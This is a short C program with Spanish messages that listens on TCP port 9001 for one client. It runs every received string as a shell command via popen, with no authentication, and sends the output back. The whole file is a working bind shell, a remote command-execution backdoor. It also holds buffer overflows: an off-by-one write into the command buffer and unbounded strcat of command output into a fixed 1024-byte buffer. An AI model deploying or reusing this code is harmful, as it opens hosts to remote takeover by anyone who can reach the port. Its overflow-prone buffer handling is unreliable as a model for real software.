#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define PORT 9001
#define BUFFER_SIZE 1024

void execute_command(const char* command, char* result) {
    FILE* fp = popen(command, "r");
    if (fp == NULL) {
        strcpy(result, "Error al ejecutar el comando.");
        return;
    }

    char buffer[BUFFER_SIZE];
    result[0] = '\0'; // Inicializar resultado

    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        strcat(result, buffer);
    }
    pclose(fp);
}

int main() {
    int servSockD = socket(AF_INET, SOCK_STREAM, 0);
    if (servSockD == -1) {
        perror("Error al crear el socket del servidor");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in servAddr;
    servAddr.sin_family = AF_INET;
    servAddr.sin_port = htons(PORT);
    servAddr.sin_addr.s_addr = INADDR_ANY;

    if (bind(servSockD, (struct sockaddr*)&servAddr, sizeof(servAddr)) == -1) {
        perror("Error al hacer el bind");
        close(servSockD);
        exit(EXIT_FAILURE);
    }

    if (listen(servSockD, 1) == -1) {
        perror("Error al escuchar conexiones");
        close(servSockD);
        exit(EXIT_FAILURE);
    }

    printf("Esperando conexiones en el puerto %d...\n", PORT);

    int clientSocket = accept(servSockD, NULL, NULL);
    if (clientSocket == -1) {
        perror("Error al aceptar conexión");
        close(servSockD);
        exit(EXIT_FAILURE);
    }

    printf("Cliente conectado.\n");

    char command[BUFFER_SIZE];
    char result[BUFFER_SIZE];

    while (1) {
        int bytesReceived = recv(clientSocket, command, BUFFER_SIZE, 0);
        if (bytesReceived > 0) {
            command[bytesReceived] = '\0';

            if (strcmp(command, "salida") == 0) {
                printf("Cliente desconectado.\n");
                break;
            }

            printf("Ejecutando comando: %s\n", command);
            execute_command(command, result);
            send(clientSocket, result, strlen(result), 0);
        }
    }

    close(clientSocket);
    close(servSockD);
    return 0;
}
